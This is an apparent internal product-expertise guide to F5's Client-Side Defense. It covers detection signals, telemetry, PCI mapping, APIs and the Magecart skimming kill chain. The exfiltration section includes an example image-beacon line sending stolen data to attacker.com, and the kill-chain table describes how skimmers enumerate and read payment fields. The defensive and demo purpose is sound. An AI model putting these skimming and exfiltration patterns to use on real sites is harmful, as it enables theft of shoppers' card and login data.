# CSD — Product Expertise

## What CSD Is

F5 XC Client-Side Defense protects web applications from client-side
attacks by injecting a lightweight telemetry script through the load
balancer. That script monitors JavaScript behavior inside the visitor's
browser, sends behavioral metadata (not user data) to the F5 platform
for ML analysis, and surfaces detections in the CSD console — giving
security teams visibility into script activity they'd otherwise never see.

## Three Detection Signals

| Signal | What it watches | Customer-facing explanation |
| ------ | --------------- | --------------------------- |
| **Form field reads** | Scripts accessing input values | Catches skimmers reading payment/login fields |
| **Script inventory** | Every script loaded by the page | Know exactly what code is running on your site |
| **Network interactions** | Script-load source domains | See which external domains your page is calling out to |

## Detection Boundaries

CSD does **not** detect — be explicit about this during demos:

- Dynamically created form fields (only fields present in the DOM at
  page load are tracked)
- Code-level pattern analysis (behavioral metadata, not source
  inspection — obfuscation is not flagged separately)
- Form overlay fields (injected overlay forms are not tracked — only
  original DOM fields)

Note: Both first-party and third-party domains appear in the Dashboard
domain table and `/detected_domains` API. Fetch/XHR destination
domains also appear in detected domains.

## How Telemetry Works

- The load balancer injects `common.js` scripts into protected pages
- Scripts send beacons to `*.zeronaught.com` in binary format (not JSON)
- Beacons report script behavior metadata — **not** the values of user
  inputs

## Two Configuration Surfaces

Both must be configured for CSD to work end-to-end:

1. **CSD Configuration page** — register the protected domain and set
   the reporting domain
2. **HTTP Load Balancer** — enable JavaScript injection to control
   which pages receive the CSD telemetry scripts

## PCI DSS v4.0 Alignment

| Requirement | What it covers | CSD mapping |
| ----------- | -------------- | ----------- |
| **6.4.3** | Script inventory and authorization | CSD enumerates all scripts and flags unauthorized ones |
| **11.6.1** | Tamper detection | CSD alerts on unexpected script changes |

## Threat Coverage

| Threat | Primary signal |
| ------ | -------------- |
| Formjacking / digital skimming | Form field reads |
| Supply chain attacks | Script inventory |
| Script injection | Script inventory + network interactions |
| Data exfiltration | Network interactions |
| Man-in-the-browser | Form field reads |
| Cryptojacking | Script inventory + network interactions |

## Magecart Kill Chain

Magecart is the umbrella term for groups that inject JavaScript skimmers
into e-commerce and login pages to steal credentials and payment data.
Notable breaches include British Airways (380,000 cards), Ticketmaster
(40,000 cards), and thousands of smaller e-commerce sites. The attack
follows a predictable kill chain that maps directly to CSD's three
detection signals.

| Attacker Phase | What happens | CSD Detection Signal | Demo-able via evaluate_script? |
| -------------- | ------------ | -------------------- | ----------------------------- |
| **Recon** | Enumerate form fields on the page (`querySelectorAll('input')`) | Form field reads | Yes (pure DOM) |
| **Harvest** | Read sensitive field values (email, password, card number) | Form field reads | Yes (pure DOM) |
| **Supply chain** | Inject `<script>` tags from external CDNs or compromised third parties | Script inventory | No (needs initScript) |
| **Exfiltrate** | Send stolen data to attacker-controlled server via fetch, XHR, or image beacon | Network interactions | No (needs initScript) |

Note: Recon and Harvest both trigger the **same** CSD detection signal
(form field reads). These are distinct attacker actions but a single
detection vector. CSD sees "which scripts read which fields" — it does
not distinguish between enumerating fields and reading their values.

**PCI DSS mapping:** The supply chain phase (unauthorized script loading)
maps to **requirement 6.4.3** (script inventory and authorization). The
exfiltration phase (unexpected network calls) maps to **requirement
11.6.1** (tamper detection and change alerting).

### Exfiltration Techniques

Magecart skimmers use several exfiltration methods:

- **fetch / XHR** — POST stolen data to an attacker endpoint. CSD
  detects the destination domain via the network interactions signal.
- **Image beacon** — `new Image().src = 'https://attacker.com/c?d=...'`
  encodes stolen data in the URL. This avoids CORS restrictions entirely
  and is invisible to the user. CSD's telemetry captures network request
  metadata from monitored scripts, which includes image beacon
  destinations initiated within the page context.
- **navigator.sendBeacon** — fires a one-way POST that survives page
  navigation. Used when the skimmer wants to exfiltrate on form submit.

CSD does **not** block fetch/XHR calls via mitigation — mitigation
targets script loading (`<script>` tag `src` interception). Exfiltration
domains are surfaced in the detected domains list for network-level
blocking by the security team.

### Live Demo: zone.js Compatibility

When demonstrating the Magecart kill chain on Angular applications
(Juice Shop), `evaluate_script` works for **pure DOM queries**
(`querySelectorAll`, reading `.value`, `.id`, `.name`) but fails when
calling any zone.js-patched API (`fetch`, `Image`, `setTimeout`,
`XMLHttpRequest`). This means:

- **Recon and Harvest** can be demoed live via `evaluate_script`
- **Supply chain injection and Exfiltration** require `initScript`
  with pre-saved native API references (see Phase 2 attack documentation)

## F5 XC Platform Operations

### Console UI Navigation

**CSD configuration:**
Log in → **Client-Side Defense** workspace → select namespace →
**Manage** → **Configuration**

**LB injection scope:**
**Multi-Cloud App Connect** → **HTTP Load Balancers** → select LB →
**Edit** → **Client-Side Defense** section

### API Authentication

Generate a token: **Administration** → **Credentials** → **API
Credentials** → **Add API Credentials**

All API calls use:

```bash
Authorization: APIToken <token>
```

**User Info:** `GET /api/web/custom/namespaces/system/whoami` — returns
the current user's email, tenant, `namespace_roles` array, and
`domain_owner` status. Useful for understanding RBAC context.

**RBAC Probe Technique:** To test write permissions non-destructively,
attempt `DELETE` on a known-nonexistent object. The API returns `403` if
RBAC denies the operation, or `404` if the operation is allowed but the
object doesn't exist. This zero-side-effect pattern works for all object
types and avoids creating temporary probe objects.

## CSD API Reference

**Base path:** `/api/shape/csd/namespaces/{namespace}/`

| Operation | Method | Path |
| --------- | ------ | ---- |
| Enable CSD | `POST` | `/api/shape/csd/namespaces/system/init` |
| Get status | `GET` | `…/status` |
| Get JS configuration | `GET` | `…/js_configuration` |
| List protected domains | `GET` | `…/protected_domains` |
| Create protected domain | `POST` | `…/protected_domains` |
| Delete protected domain | `DELETE` | `…/protected_domains/{name}` |
| List detected domains | `GET` | `…/detected_domains` |
| List scripts | `GET` | `…/scripts` |
| List form fields | `GET` | `…/form_fields` |
| Allow domain | `POST` | `…/allow_domain` |
| Mitigate domain | `POST` | `…/mitigate_domain` |

**LB API:** `/api/config/namespaces/{namespace}/http_loadbalancers/{name}`

**Namespace API:** `/api/web/namespaces/`

| Operation | Method | Path | Body |
| --------- | ------ | ---- | ---- |
| List namespaces | `GET` | `/api/web/namespaces` | — |
| Get namespace | `GET` | `/api/web/namespaces/{name}` | — |
| Create namespace | `POST` | `/api/web/namespaces` | `{"metadata": {"name": "..."}, "spec": {}}` |
| Cascade delete namespace | `POST` | `/api/web/namespaces/{name}/cascade_delete` | `{"name": "..."}` |

Note: The `spec` field is required for creation (empty `{}` is valid).
Standard `DELETE` returns "Not Implemented" — use cascade delete.

## API Conventions

- **POST** returns the created object as JSON
- **PUT** and **DELETE** return empty `{}` on HTTP 200 — not an error
- **List endpoints** return items with top-level `.name`; use
  `.items[].name`
- **Individual GET** returns `.metadata.name` and `.spec.*`
- For protected domains, `{name}` in the path is the **domain value
  itself** (e.g. `bankexample.com`), not an arbitrary object name
